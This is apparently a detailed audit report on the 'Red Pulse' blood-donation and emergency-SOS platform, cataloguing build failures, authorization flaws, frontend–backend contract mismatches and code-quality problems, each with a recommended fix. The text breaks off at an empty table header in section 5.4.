# COMPLETE CODEBASE AUDIT REPORT

**Project:** Red Pulse — Blood Donation, Emergency SOS & Hospital Blood-Bank Platform
**Repository:** `Red-Pulse Backend/red-pulse` + `Red Pulse-Frontend` (monorepo)
**Audit date:** 2026-09-26 → 2026-09-27
**Auditor scope:** Full manual source review of all backend Java sources, all Flyway migrations, and the complete frontend source tree — plus executed build, lint, type-check, test, and security tooling.

> **Methodology note.** This audit is evidence-based. Every "confirmed" finding below is backed by either (a) code read directly from the repository with a file path and line number, or (b) the observed output of a command that was actually executed. Findings that could not be verified are explicitly labelled **SUSPECTED**. Stylistic preferences are not reported as bugs.

> **Non-modification disclosure.** No source file was modified. No commit was created. No branch was changed. No dependency was installed. No file was deleted. Git history was not touched. Two side effects of running the project's own build tooling occurred and are disclosed for transparency:
> 1. `npm run build` regenerated the git-ignored `Red Pulse-Frontend/dist/` output.
> 2. `mvnw test` refreshed the git-ignored `target/surefire-reports/` output.
>
> `mvn clean` was **deliberately not run**, because it would have destroyed the stale-artifact evidence that is the root cause of finding BE-001.

---

## TABLE OF CONTENTS

1. [Executive Summary](#1-executive-summary)
2. [Project Architecture](#2-project-architecture)
3. [Repository Inventory](#3-repository-inventory)
4. [Build & Compilation Issues](#4-build--compilation-issues)
5. [Frontend Issues](#5-frontend-issues)
6. [Backend Issues](#6-backend-issues)
7. [API Issues](#7-api-issues)
8. [Authentication & Authorization Issues](#8-authentication--authorization-issues)
9. [Security Vulnerabilities](#9-security-vulnerabilities)
10. [Database Issues](#10-database-issues)
11. [Performance Issues](#11-performance-issues)
12. [Code Quality Issues](#12-code-quality-issues)
13. [Dependency Audit](#13-dependency-audit)
14. [Testing Audit](#14-testing-audit)
15. [DevOps / Deployment Audit](#15-devops--deployment-audit)
16. [Git / Repository Hygiene](#16-git--repository-hygiene)
17. [Business Logic Problems](#17-business-logic-problems)
18. [End-to-End Flow Problems](#18-end-to-end-flow-problems)
19. [TODO / FIXME / Placeholder Inventory](#19-todo--fixme--placeholder-inventory)
20. [Issue Master List](#20-issue-master-list)
21. [Root Cause Analysis](#21-root-cause-analysis)
22. [Production Readiness Checklist](#22-production-readiness-checklist)
23. [Recommended Fix Order](#23-recommended-fix-order)
24. [Definition of Done](#24-definition-of-done)
25. [Final Conclusion](#25-final-conclusion)
- [Appendix A — Page/Component/Mock/Test Layer Findings](#appendix-a--pagecomponentmocktest-layer-findings)
- [Appendix B — Complete File Inventory](#appendix-b--complete-file-inventory)
- [Appendix C — Raw Command Output](#appendix-c--raw-command-output)

---

## 1. Executive Summary

**Project:** Red Pulse — a blood donation, emergency SOS dispatch, and hospital blood-bank inventory platform serving 4 authenticated roles (DONOR, REQUESTER, HOSPITAL, ADMIN) plus an unauthenticated public SOS path.

**Technology:**
- **Backend:** Spring Boot 4.1.1, Java 21, Spring WebMVC, Spring Security, Spring Data JPA, Spring Validation, Spring Mail, Flyway 12.4.0, springdoc-openapi 2.8.13, jjwt 0.12.6, firebase-admin 9.4.3, Lombok, PostgreSQL 18.3, Maven
- **Frontend:** React 19.2, TypeScript 5.9, Vite 7.3, TanStack Query 5, React Router 7, Zod 4, Recharts 3, Tailwind CSS 4, lucide-react, Vitest 3

**Architecture:** A monorepo containing two independently-built deployables with **no shared contract enforcement**. The backend is a layered (controller → service → repository) modular monolith. The frontend is a feature-folder SPA with a hand-written API adapter layer. Authentication is stateless JWT with a client-side refresh layer.

### 1.1 Overall implementation status: NOT PRODUCTION-READY

The dominant characteristic is a **systemic authorization failure**, not a collection of isolated bugs. The single most important structural fact:

> **`@PreAuthorize` appears 3 times in the entire 102-file backend, all on `/api/admin`. Every other endpoint is governed solely by `anyRequest().authenticated()`.** Thirty-five endpoints have neither a role check nor an ownership check. One `permitAll` endpoint mints valid JWTs for an arbitrary account.

### 1.2 Empirical build & test results (executed, not assumed)

| Check | Command | Result |
|---|---|---|
| Backend compile | `mvnw -o -DskipTests compile` | PASS — exit 0 |
| **Backend tests** | `mvnw -o test` | **FAIL — exit 1 (BUILD FAILURE)** |
| Frontend type-check | `npx tsc -b` | PASS — exit 0 |
| Frontend lint | `npx eslint .` | PASS — exit 0 (2 warnings) |
| Frontend tests | `npx vitest run` | PASS — exit 0, 9/9 |
| Frontend build | `npm run build` | PASS — exit 0, **1,105 kB single chunk** (Vite warns >500 kB) |
| Production dependency audit | `npm audit --omit=dev` | PASS — **0 vulnerabilities** |
| Recorded app startup | `startup.log` | **FAIL — Flyway checksum mismatch, context did not load** |
| Mock-mode token consistency | `npx vitest run` (mock path) | **FAIL — mock returns a token its own guard rejects** |

### 1.3 Summary of findings

**Critical (P0) — 19 findings.** Including:
- A **permit-all endpoint that issues valid access + refresh JWTs for any account whose phone number or email the caller supplies** (SEC-001) — unauthenticated-to-administrator account takeover.
- **OTP attempt lockout completely defeated by transaction rollback** (SEC-003) — removes the only barrier protecting SEC-001.
- **A refresh token is a valid access token** (SEC-002) — a stolen 7-day token is a 7-day takeover.
- **Any authenticated user can add/set/deduct any hospital's blood inventory** (SEC-004) — patient-level clinical harm.
- **Any authenticated user can forge donation records for any donor** (BE-104).
- **Three admin pages are entirely non-functional against the real backend** (FE-100/101/102).
- **The backend does not build, does not start, and is not in version control.**

**Major (P1) — 88 findings.** Systemic IDOR across every module; health-data exposure; no audit trail for compliance-critical actions; `ForbiddenException` returning HTTP 500; zero pagination anywhere; no optimistic locking; password reset non-functional end-to-end; two core features (donor alerting, emergency broadcast) that are stubs returning fabricated success; five frontend/backend enum contracts silently diverged; hardcoded fake data submitted to the real backend from six distinct sites.

**Minor (P2/P3) — 174 findings.** Dead code (13 zero-byte files, 5 declaration-only classes, 22 dead frontend exports), text-encoding corruption in user-visible strings, N+1 queries, accessibility gaps, no Docker, no CI/CD, no README.

**Security risks:** No rate limiting anywhere; no Content-Security-Policy; tokens in `localStorage`; raw exception messages returned to clients; CSV formula injection in all 7 admin exports; no security audit logging; fabricated audit IP addresses.

**Performance problems:** Zero pagination on any endpoint; `findAll()`-then-aggregate-in-Java for all admin analytics; N+1 in leaderboard, matching, and every response mapper; 1.1 MB un-split JavaScript bundle.

**Testing gaps:** 7 backend tests (1 fails) + 9 frontend tests (4 of which only test Zod schemas). **Zero** coverage of authorization, OTP verification, business rules, controllers, migrations, API adapters, HTTP interceptors, or `AuthContext`. No end-to-end tests. No coverage tooling.

**Architecture problems:** No shared API contract (and normalisation applied to only 7 of 12 adapters); authorization enforced ad-hoc in 3 places; business rules duplicated with *divergent* results; transaction and authorization concerns placed in controllers; "fake success" used in place of unimplemented features.

### 1.4 Scoring methodology (defined, not arbitrary)

Scores are 0–5 per dimension, weighted. Each score is derived from the objective evidence in §1.2, not from impression.

| Dimension | Weight | Score | Evidence basis |
|---|---:|---:|---|
| Build & CI reproducibility | 15% | **1.0** | `mvn test` exit 1; no CI ever existed; no Docker; backend untracked |
| Correctness & business logic | 25% | **1.5** | 3 stubbed features returning fake success; 2 broken end-to-end flows; 4 divergent eligibility/badge implementations; 3 admin pages non-functional |
| Security | 25% | **0.5** | Unauthenticated account-takeover chain; ~35 unauthorised endpoints; no rate limiting; no CSP; CSV injection |
| Data & integrity | 15% | **2.0** | Sound FK/index/CHECK base; but no pagination, no optimistic locking, no `units_fulfilled`, no `expiry_date` |
| Test coverage | 10% | **0.5** | 16 tests; 1 fails; 0% coverage of all critical paths |
| Maintainability & docs | 10% | **1.5** | 13 empty files, 22 dead exports, 4 duplicate notification pages, no README, 5 enum drifts |
| **WEIGHTED TOTAL** | 100% | **≈ 1.2 / 5.0** | |

**Scoring anchors used (so the number is auditable):**
- **5.0** — production-proven, fully automated pipeline, comprehensive tests, no open P0/P1.
- **4.0** — no open P0; P1s are tracked with workarounds; green pipeline; meaningful test coverage.
- **3.0** — builds and tests green; P0s are theoretical/mitigated; documented gaps.
- **2.0** — builds but the test suite is unreliable or trivially shallow; several P1s in production paths.
- **1.0** — build is red or feature-critical paths are broken; P0s are reachable.
- **0.0** — does not run.

Red Pulse scores **1.2** because the backend build is red, the emergency broadcast feature does not exist, three admin pages do not function, and an unauthenticated account-takeover chain is present.

---

## 2. Project Architecture

### 2.1 Component diagram

```
┌──────────────────────────────────────────────────────────────────────────┐
│                          BROWSER (SPA)                                    │
│  React 19.2 + Vite 7.3 + TS 5.9 + TanStack Query 5 + React Router 7       │
│  + Zod 4 + Recharts 3 + Tailwind 4 + lucide-react + sonner               │
│                                                                          │
│  main.tsx                                                                 │
│   └ ErrorBoundary → QueryClientProvider → ThemeProvider                   │
│                    → AuthProvider → BrowserRouter → AppRoutes            │
│                                                                          │
│  Routes:  PublicLayout (7 pages) │ AuthLayout (4)                        │
│           4× (ProtectedRoute → RoleRoute → RoleLayout)                  │
│      ┌───────────────────────────────────────────────────────────┐        │
│      │ api/index.ts → env.useMockApi ? mockApis : realApis        │        │
│      │ real.ts → 16 adapters                                      │        │
│      │   NORMALISED (7): bloodRequest, emergency, appointment,    │        │
│      │                   inventory, donation, contribution,        │        │
│      │                   notification                             │        │
│      │   NOT NORMALISED (5): admin, analytics, matching, user,    │        │
│      │                        hospitalApi.bloodRequests  ← §5 root│        │
│      │      └─ axios instance (baseURL from VITE_API_BASE_URL)     │        │
│      │         · request  interceptor: inject Bearer accessToken   │        │
│      │         · response interceptor: 401 → refresh → replay      │        │
│      └───────────────────────────────────────────────────────────┘        │
│  Tokens: localStorage['redpulse.accessToken' / 'redpulse.refreshToken']  │
└────────────────────────────────┬─────────────────────────────────────────┘
                                 │ HTTPS / CORS (allow-origin: http://localhost:5173)
                                 ▼
┌──────────────────────────────────────────────────────────────────────────┐
│                    SPRING BOOT 4.1.1 (Tomcat 11, port 8080)                │
│                                                                          │
│  SecurityFilterChain [stateless, CSRF disabled]                          │
│   permitAll: /api/auth/{register,login,refresh,forgot-password,           │
│              reset-password,firebase/phone},                              │
│              /api/emergency/{otp/request,otp/verify,verify-and-dispatch}, │
│              /swagger-ui/**, /v3/api-docs/**                              │
│   anyRequest: authenticated     ← NO entry point → returns 403, not 401  │
│   └ JwtAuthenticationFilter (OncePerRequestFilter) → UserPrincipal        │
│       · re-reads user.isActive() per request (good)                       │
│       · 2 EMPTY catch blocks (BE-144)                                    │
│                                                                          │
│  @PreAuthorize("hasRole('ADMIN')")  ← 3 annotations TOTAL, all /api/admin │
│                                                                          │
│  13 controllers / 12 services / 10 repositories / 11 entities             │
│   auth · user · donor(contribution) · hospital · inventory · matching ·   │
│   donation · appointment · notification · request(blood+emergency) · admin│
│                                                                          │
│  GlobalExceptionHandler — 8 handlers; ForbiddenException NOT handled      │
│  AppointmentReminderService — @Scheduled hourly (@EnableScheduling ON)    │
│  DataInitializer — optional admin bootstrap (ADMIN_BOOTSTRAP_ENABLED)     │
│  SwaggerAutoOpen — opens a browser in EVERY profile                       │
└───────────────┬──────────────────────────────────────┬───────────────────┘
                │                                      │
                ▼                                      ▼
┌───────────────────────────────┐   ┌──────────────────────────────────────┐
│ PostgreSQL 18.3 + Flyway 12.4 │   │ External services                    │
│ ddl-auto: validate            │   │  • SMTP smtp.gmail.com:587 (OTP +    │
│ open-in-view: false           │   │    password reset) — REQUIRED,       │
│ 9 migrations V1–V9 (V6 empty) │   │    DISABLED in committed .env        │
│ 10 tables + 30+ indexes       │   │  • Firebase Admin (ID-token verify)  │
│ NO pagination support         │   │    — CONFIG CLASS FULLY COMMENTED    │
│ NO @Version on any entity     │   │  • SMS provider — declared, NEVER    │
│ NO units_fulfilled            │   │    INJECTED ANYWHERE                 │
│ NO expiry_date / reserved     │   │  • Push/FCM — NOT IMPLEMENTED        │
└───────────────────────────────┘   └──────────────────────────────────────┘
```

### 2.2 Data model as actually implemented

```
users ──1:1──> donor_profiles   (user_id UNIQUE, FK CASCADE)
  │    └──1:1──> hospitals       (user_id UNIQUE, FK SET NULL)
  │
  ├──1:N──> blood_requests      (requester_id CASCADE, hospital_id SET NULL)
  │            └──1:1──> emergency_requests (blood_request_id UNIQUE CASCADE)
  │
  ├──1:N──> appointments        (donor_id CASCADE, hospital_id CASCADE,
  │            │                  blood_request_id SET NULL)
  │            └──1:N──> donations (appointment_id SET NULL)
  │
  ├──1:N──> donations           (donor_id CASCADE, hospital_id CASCADE)
  ├──1:N──> notifications       (user_id CASCADE)
  └──1:N──> audit_logs          (user_id SET NULL)

hospitals ──1:N──> blood_inventory  (UNIQUE(hospital_id,blood_group),
                                     CHECK quantity_units >= 0,
                                     FK CASCADE)

Standalone tables:
  emergency_email_otps   (8 columns, 4 indexes) — no FK, grows unbounded
  emergency_verifications(7 columns, 2 indexes) — no FK, grows unbounded
```

### 2.3 Schema gaps versus the specification

`ROLES_AND_ENTITIES_WORKFLOW_MATRIX.md` (the project's declared "single source of truth", v1.0.0) requires the following, none of which exists:

| Required by spec | Actual schema | Finding |
|---|---|---|
| `blood_inventory.expiration timestamp` | absent | DB-001 |
| `blood_inventory` units reserved | absent | DB-001 |
| `blood_inventory` batch records | absent | DB-001 |
| `blood_requests.units fulfilled` | absent | DB-002 |
| `donor_profiles.total donation count` | absent (computed) | DB-003 / BE-129 |
| `hospitals` status (ACTIVE/INACTIVE/PENDING) | two booleans | BL-017 |
| `users` status PENDING | enum lacks it | FE-015 |
| `AuditLog` JSON details payload | absent | BL-006 |
| `EmergencyRequest` parent link "optional" | `NOT NULL UNIQUE` | BL-020 |

---

## 3. Repository Inventory

### 3.1 Structure

```
Red Pulse - Project/
├── .gitignore
├── ROLES_AND_ENTITIES_WORKFLOW_MATRIX.md   (untracked, 28 KB, the spec)
├── COMPLETE_CODEBASE_AUDIT_REPORT.md        (this document)
│
├── Red Pulse-Frontend/                      132 tracked files
│   ├── .env            (ignored)  .env.example
│   ├── dist/           (ignored)  stale build output
│   ├── src/  (70 files, 8,688 lines)
│   └── package.json / package-lock.json / vite / vitest / tsconfig ×3 / eslint
│
└── Red-Pulse Backend/red-pulse/             ** ENTIRELY UNTRACKED **
    ├── .env (ignored)  .env.example  .gitignore  .gitattributes
    ├── HELP.md  startup.log (ignored)  package.json (ORPHAN)
    ├── mvnw / mvnw.cmd / .mvn/wrapper/  pom.xml
    ├── target/ (ignored, contains a STALE application.yml — see BE-001)
    └── src/
        ├── main/java/com/redpulse/   102 files
        ├── main/resources/           application.yml, application-{dev,prod}.yml (both EMPTY), db/migration V1–V9
        └── test/java/com/redpulse/   4 files, 7 tests
```

### 3.2 Counts

| Area | Count | Notes |
|---|---:|---|
| Backend Java source files | 102 | **10 are completely empty (0 bytes)** |
| Backend controllers | 13 | 4 in `request`, 2 in `admin`, 1 each elsewhere |
| Backend services | 12 | incl. 1 dead (`UserService`) |
| Backend repositories | 10 | **0 paginated, 0 projections** |
| Backend entities | 11 | **0 with `@Version`** |
| Flyway migrations | 9 | `V6` is **empty**; V1–V5 edited post-apply |
| Backend tests | 7 | **1 of 4 test classes fails** |
| Frontend tracked files | 132 | **130 locally modified & uncommitted** |
| Frontend pages | 37 | 5,179 lines; largest is 212 lines |
| Frontend components | 23 | 1,370 lines; largest is 187 lines |
| Frontend API adapters | 18 | + `contracts.ts` (18 interfaces) |
| Frontend test files / tests | 5 / 9 | **1 file excluded from `npm test`** |
| Frontend mocks | 3 | 1,265 lines |
| **Untracked files** | **180** | **the entire backend** |
| **Commits on `main`** | **1** | + 1 unreachable `copilot checkpoint` |
| README / LICENSE / CI / Dockerfile | **0** | only `HELP.md` (Initializr boilerplate) |

### 3.3 Codebase inventory by module

#### 3.3.1 Backend — module map

| Module | Controllers | Services | Repos | Entities | DTOs | Enums | Status |
|---|---|---|---|---|---|---|---|
| `auth` | 2 | 2 | 0 | 1 (dup) | 7 | 1 (dup) | Firebase path broken (AUTH-016) |
| `user` | 2 | 3 (1 dead) | 2 | 2 | 8 | — | Divergent duplicate service |
| `hospital` | 1 | 1 | 1 | 1 | 2 | — | No authorisation on PUT |
| `inventory` | 1 | 1 | 1 | 1 | 3 | 1 (empty) | **No authorisation at all** |
| `donation` | 1 | 1 | 1 | 1 | 2 | — | Forgery + cancel-after-complete |
| `appointment` | 1 | 2 | 1 | 1 | 3 | — | `complete` has no principal |
| `notification` | 1 | 1 | 1 | 1 | 1 | — | Delete has no ownership check |
| `request` | 3 | 3 | 4 | 4 | 9 | — | Contains the P0 |
| `matching` | 1 | 1 | 0 | 0 | 2 | — | `notifyDonor` is a stub |
| `admin` | 2 | 1 | 1 | 1 | 2 | — | `findAll()` analytics |
| `common` | — | — | — | — | — | 13 | 13 files empty/dead |
| `config` | — | — | — | — | — | — | 3 of 9 empty |
| `enums` | — | — | — | — | — | 13 | 2 empty |

#### 3.3.2 Backend — per-module assessment

| Module | Purpose | Dependencies | Consumers | External deps | Potential problems | Complete? |
|---|---|---|---|---|---|---|
| `auth` | Register, login, refresh, password reset, Firebase phone | user, hospital, mail, jwt | all authenticated flows | SMTP, Firebase | In-memory reset tokens; no revocation; `login` skips blocked check; Firebase path 500s | **Partial** |
| `user` | Profiles, donor eligibility, contributions, leaderboard | user, donation, hospital | all role dashboards | — | 4 divergent eligibility/badge implementations; N+1; IDOR on `/donors/{id}` | **Partial** |
| `hospital` | Hospital CRUD, directory | user | donor/requester/admin | — | `PUT /{id}` unauthorised; no approval flow; reg-number 500 | **Partial** |
| `inventory` | Blood stock ledger | hospital | hospital dashboard, donation cascade | — | **Zero authorisation**; no expiry; no reservation; lost updates | **No** |
| `donation` | Clinical donation record | user, hospital, appointment, inventory, notification | all dashboards | — | Unauthorised forgery; cancel-after-complete; no `@Version` | **No** |
| `appointment` | Booking lifecycle + reminders | user, hospital, blood_request, notification | donor + hospital | — | `complete` has no principal; no conflict detection; 500 on denial | **No** |
| `notification` | In-app inbox | user | all roles | — | Delete has no ownership check; no pagination; no push | **Partial** |
| `request` | Blood requests + emergency SOS + email OTP | user, hospital, mail, jwt | all roles | SMTP | **P0 account takeover**; 3 unauthorised mutations; OTP lockout broken | **No** |
| `matching` | Geo + blood-group donor matching | user, blood_request, hospital | requester, donor | — | N+1; hardcoded coords; ignores eligibility; `notify` is a stub | **Partial** |
| `admin` | Dashboards, analytics, CSV reports, audit, user governance | all | admin only | — | `findAll()` everywhere; CSV injection; fake IPs; self-block possible | **Partial** |
| `common` | Security, exceptions, OTP, notification, utils | — | — | — | 13 dead/empty files | **No** |
| `config` | Security, CORS, mail, data init, Swagger | — | — | — | Empty Swagger browser in prod; hardcoded CORS | **Partial** |

#### 3.3.3 Frontend — module map

| Area | Files | Purpose | Status |
|---|---:|---|---|
| `api/` | 18 | Backend adapters + type contracts | **7 of 12 normalise; 5 do not** |
| `context/` | 4 | Auth, Theme | Full-page reload on logout |
| `routes/` | 3 | Route table + guards | 2 orphaned routes |
| `pages/` | 37 | 5,179 lines of screens | 3 admin pages non-functional |
| `components/` | 23 | 1,370 lines | Well-built; 7 primitives unused |
| `schemas/` | 1 | Zod validation | Looser than UI labels claim |
| `types/` | 2 | Enums + models | 5 enums drift from backend |
| `mocks/` | 3 | Mock API bundle | Well isolated; conceals prod bugs |
| `utils/` | 4 | cn, debounce, download, format | 4 of 4 largely dead |
| `constants/` | 5 | env, storage, nav, blood, queryKeys | 1 dead export |
| `__tests__/` | 5 | 9 tests | 1 excluded; 4 test only Zod |

### 3.4 Dead code with ZERO references (verified by grep across all `.java`)

**13 zero-byte files:**
`common/security/JwtService.java`, `common/dto/ApiResponse.java`, `common/dto/ErrorDetail.java`, `common/dto/PageResponse.java`, `common/exception/BaseException.java`, `common/audit/AuditAspect.java`, `common/audit/LoggableAction.java`, `common/audit/AuditEventPublisher.java`, `config/OpenApiConfig.java`, `config/AsyncConfig.java`, `common/utils/DateTimeUtils.java`, `enums/VerificationStatus.java`, `enums/InventoryStockStatus.java`

**Declaration-only (1 match = its own definition):**
`modules/user/service/UserService.java` (entire class), `modules/auth/Entity/Role.java`, `InventoryService.checkAvailability`, `AuthService.getCurrentUser`, `AuditLogRepository.findByCreatedAtBetweenOrderByCreatedAtDesc`, `JwtUtils.extractEmail`, `JwtUtils.extractRole`, `NotificationRepository.countByUserIdAndReadFalse`, `SecurityUtils.hasRole`, `SecurityUtils.getCurrentUserEmail`, `SecurityUtils.isAuthenticated`, `DonationService.completeDonation(UUID)`, `AppointmentUpdateRequest`, `EmergencyOtpRequest`, `SharedOtpStore`, `DevelopmentSmsService`

**The entire `common/otp` package is orphaned** — `OtpStore` has zero production consumers. `InMemoryOtpStoreTest` tests dead code. `SmsService` is declared with two implementations and injected nowhere: **SMS is entirely unwired**, contradicting spec §5.

**22 dead frontend exports** (see Appendix A §A.4).

### 3.5 What appears complete

In the interest of fairness, the following are genuinely well-built:

- `src/components/common/Button.tsx` — `disabled={disabled || loading}` correctly prevents double submission; spinner is `aria-hidden`; `type` defaults to `"button"`.
- `src/components/common/ErrorBoundary.tsx` — correct `getDerivedStateFromError` + `componentDidCatch` + resettable fallback.
- `src/components/tables/DataTable.tsx` — correct `key` usage, proper loading→error→empty→data precedence, `role="tablist"`/`aria-selected`.
- `src/components/common/Feedback.tsx` — correct `role="status"` / `role="alert"` usage.
- `src/components/layout/*` — correct keys, `aria-label` on all icon buttons.
- `src/index.css` — clean Tailwind v4 `@theme`, all custom properties defined and consumed, global `:focus-visible` outline.
- `src/pages/public/HomePage.tsx` — correct keys, honest mock-data labelling.
- `src/mocks/` bundle isolation — type-safe, cleanly swapped, honestly surfaced via `MockBanner`.
- Backend DDL — real foreign keys with deliberate cascade semantics, CHECK constraints, composite unique constraints, 30+ indexes including composite and partial.

---

## 4. Build & Compilation Issues

The backend **compiles** and the frontend **compiles, lints, and bundles**. The failures are at test time and at startup.

| ID | Severity | File | Line | Issue | Root Cause | Impact | Fix |
|---|---|---|---|---|---|---|---|
| **BE-001** | **P0** | `target/test-classes/application.yml` | 1–4 | **`mvn test` = BUILD FAILURE.** `RedPulseApplicationTests.contextLoads` fails with `Failed to determine a suitable driver class` | A **stale 96-byte `application.yml`** dated 2026-09-19 sits in `target/test-classes/`. Surefire places `test-classes` *before* `classes` on the classpath, and `maven-resources-plugin` does **not** delete stale outputs when `src/test/resources` doesn't exist. It shadows the real 2,038-byte config, so the test context loads **no `spring.datasource`, no `jwt.*`, no `app.*`** | Build is red. Any CI gate fails. Verified: setting `DB_URL`/`DB_PASSWORD` as env vars did **not** help, because the keys are absent from the loaded config entirely | `mvn clean test`; bind `maven-clean-plugin` to the `test` phase; commit a complete `src/test/resources/application-test.yml` so no stale file can shadow config |
| **BE-002** | **P0** | `pom.xml` | — | **No embedded/test database dependency.** `dependency:tree` confirms no H2, HSQLDB, Derby, or Testcontainers — only JUnit 6.0.3, AssertJ 3.27.7, Mockito 5.23.0 | `@SpringBootTest` has no way to provision a datastore | Even after `mvn clean`, `contextLoads` requires a live PostgreSQL reachable via externally-supplied env vars. The suite is **not hermetic** and cannot run in CI. This is the *second, independent* blocker behind BE-001 | Add Testcontainers PostgreSQL, or an H2 + `@DataJpaTest` profile |
| **BE-003** | **P1** | `startup.log` (recorded) | 118–124 | **App does not start on the existing database:** `Validate failed: Migrations have failed validation / Migration checksum mismatch for migration version 1` (applied `-1943230858` vs resolved `-1547703938`) | V1–V5 were edited **after** being applied to the dev database; no immutable-migration discipline | The developer's own database is wedged. Fresh databases migrate cleanly, so this is an environment blocker plus a process signal, not a universal build break | `flyway repair`; adopt "never edit an applied migration"; add `flyway validate` to CI |
| **BE-004** | P2 | `pom.xml` | 68–70 | `springdoc-openapi-starter-webmvc-ui:2.8.13` is the Spring Boot **3.x** line, pinned onto Boot **4.1.1** (springdoc 3.x is the Boot 4 line) | Version-line mismatch | **Not proven broken** — the condition-evaluation report shows `SpringDocConfiguration#openAPIBuilder matched` and startup proceeds past it. Flagged as a support-alignment risk | Verify against springdoc's Boot 4 support matrix; align to 3.x if required |
| **BE-005** | P2 | `application-dev.yml`, `application-prod.yml` | — | **Both files are 0 bytes** | Placeholders never written | `SPRING_PROFILES_ACTIVE=prod` loads an empty profile. All "production" behaviour is governed by ad-hoc `@Profile("!dev & !test")` annotations scattered across 6 classes | Author real, reviewed `dev`/`prod` profiles |
| **BE-006** | P3 | `startup.log:35` | — | `Found 1 JPA repository interface` | The repository count is logged as 1 although 10 repositories exist | **SUSPECTED** — the log line may be truncated by the logger format. Not confirmed as a defect; flagged for verification | Re-run with the app booting and confirm the Spring Data scan count |
| **BE-007** | P2 | `mvnw` output | — | `Mockito is currently self-attaching to enable the inline-mock-maker. This will no longer work in future releases of the JDK.` | Mockito not registered as a test agent | Forward-compatibility break with no action taken | Add `-javaagent` config for `mockito-core` |
| **FE-001** | P2 | `package.json` | 12 | `"test:integration": "vitest run --environment node src/__tests__/*.integration.test.ts"` | Shell glob + vitest substring filter; the glob is not expanded by `cmd.exe` and is not a valid vitest filter | The integration suite is effectively unreachable — which is why `frontend.integration.test.ts` never runs | Replace with a dedicated vitest project/config |
| **FE-002** | P2 | `vite.config.ts` | 6–11 | No `build.rollupOptions`, no `manualChunks`, no proxy, no `chunkSizeWarningLimit` | Default single-chunk config | Confirmed: `✓ 2572 modules transformed` → **`dist/assets/index-CYzNQmcM.js` = 1,105.15 kB (316.90 kB gzip)**, with Vite emitting `(!) Some chunks are larger than 500 kB` | Lazy-load routes; split `recharts` and `react-router`; add a size budget |

**There are ZERO compilation errors in either codebase.** `tsc -b` exit 0; `eslint .` exit 0 (2 `react-refresh/only-export-components` warnings at `AuthContext.tsx:104` and `ThemeContext.tsx:12`); `mvnw -o compile` exit 0.

---

## 5. Frontend Issues

### 5.1 Pages that are entirely non-functional against the real backend (P0)

| ID | Severity | File:Line | Issue |
|---|---|---|---|
| **FE-100** | **P0** | `pages/admin/AdminAuditLogsPage.tsx:18-21` | `adminApi.filterAuditLogs({page,size,search})` calls `GET /api/admin/audit-logs/filter`, but the backend declares **`@RequestParam String action` (required)** at `AdminController.java:37-40`. The frontend never sends `action` → **HTTP 400 on every load.** The whole page is dead in real mode |
| **FE-101** | **P0** | `pages/admin/AdminDashboardPage.tsx:74-84, 94-99, 110-166`; `types/models.ts:213-221` | `analyticsApi.overview()` has **no normaliser**. Frontend `AnalyticsOverview` reads `totalBloodInventory`, `emergencyRequests`, `activeBloodRequests`; backend `AdminDashboardResponse` sends `totalBloodStockUnits`, `activeEmergencies`, `totalBloodRequests`. **3 of 6 KPI cards permanently render `0`** while the 3 matching cards show real numbers. All **4 charts read `.series`/`.breakdown`** but the backend returns flat maps → **permanently blank** |
| **FE-102** | **P0** | `pages/admin/AdminAnalyticsPage.tsx:26-27, 31, 36, 71, 83, 97, 116` | From/To date pickers have **zero effect** (backend accepts no query parameters) and all 4 charts are empty. Two hardcoded 2026 dates ship as the default UI state |

### 5.2 Field-name mismatches where no normaliser exists (P1)

| ID | Severity | File:Line | Frontend expects | Backend actually sends | Impact |
|---|---|---|---|---|---|
| **FE-107** | **P1** | `api/hospitalApi.ts:16` | `h.status`, `h.isActive` | `active`, `verified` (booleans) | **Every hospital renders `ACTIVE`**, including suspended ones. `AdminHospitalsPage:74` and `HospitalProfilePage:77` affected |
| **FE-108** | **P1** | `types/models.ts:264-271` + `api/matchingApi.ts` | `approximateDistanceKm`, `available`, `verificationStatus` | `distanceKm`, `availabilityStatus`, `verified` | No verification badge; `FindDonorsPage:70` shows **BUSY for every donor including available ones**; both pages show a **fabricated distance** (`?? 3`, `?? 4`). Also `FindDonorsPage:42` claims *"Exact donor personal details are masked"* while the endpoint returns `fullName` and `phone` |
| **FE-109** | **P1** | `pages/admin/AdminDonorsPage.tsx:60,61,90,98,104` | `firstName`, `lastName`, `email`, `available`, `verificationStatus` | none of these exist on `DonorProfileResponse` | Blank names, always-OFFLINE status, no badge, and "Verify Donor" offered on already-verified donors |
| **FE-110** | **P1** | `types/models.ts:201-211` + `AdminAuditLogsPage.tsx:39,63` | `timestamp`, `entity` | `createdAt`, `entityType` | `Invalid Date` in the Timestamp column; empty entity column. Combined with FE-100, this page is **100% broken** |
| **FE-111** | P2 | `api/hospitalApi.ts:60-63` | typed `PageResponse<BloodRequest>` with `requiredDate` | raw `BloodRequestResponse` with `requiredBy` | "Required Date" always `—`. **The TypeScript type is actively lying** |

### 5.3 Enum / contract drift (P1)

Five separate enums have diverged between frontend and backend. Because the adapters coerce with `asEnumValue(value, [...literals], fallback)` and **silently substitute the fallback**, every one of these produces invisible data corruption rather than an error.

| ID | Severity | Enum | Frontend | Backend | Silent effect |
|---|---|---|---|---|---|
| **FE-011** | **P1** | `Urgency` | `NORMAL, URGENT, EMERGENCY` | + **`CRITICAL`** | `bloodRequestApi.ts:20` coerces `CRITICAL`→`NORMAL`. **Every emergency displays as "Normal" in donor and requester UIs.** `Badge.tsx:22` has an unreachable `CRITICAL` tone |
| **FE-013** | **P1** | `EmergencyStatus` | `OPEN, ALERT_SENT, RESOLVED, CANCELLED` | **`ACTIVE`**, ALERT_SENT, RESOLVED, CANCELLED | `ACTIVE`→`OPEN` relabel. `Badge.tsx` has a tone for `OPEN` but not `ACTIVE` → **wrong colour too** |
| **FE-014** | **P1** | `UserStatus` | `ACTIVE, BLOCKED, **PENDING**` | `ACTIVE, **INACTIVE**, BLOCKED` | **An `INACTIVE` user displays as `ACTIVE`.** `AdminUsersPage:112` renders them with an **"Unblock"** button. The `PENDING` filter returns nothing (no such backend status) |
| **FE-015** | **P1** | `NotificationType` | 6 values | **14 values** | 8 types → `SYSTEM`. Real appointment/donation/badge notifications all relabelled "System". No `SYSTEM` tone in `Badge.tsx` → grey |
| **FE-012** | P3 | `URGENCY_LABELS` | 3 of 4 keys | — | **Downgraded to P3**: `URGENCY_LABELS` is a dead export (never imported), so there is no current runtime impact. The real defect is FE-011 |

### 5.4 Hardcoded mock / fake data submitted to the real backend (P1)

Six distinct fabrication sites. Each writes a fabricated value into a real database record.

| ID | Severity | Location | Fabricated value | Consequence |
|---|---|---|---|---|
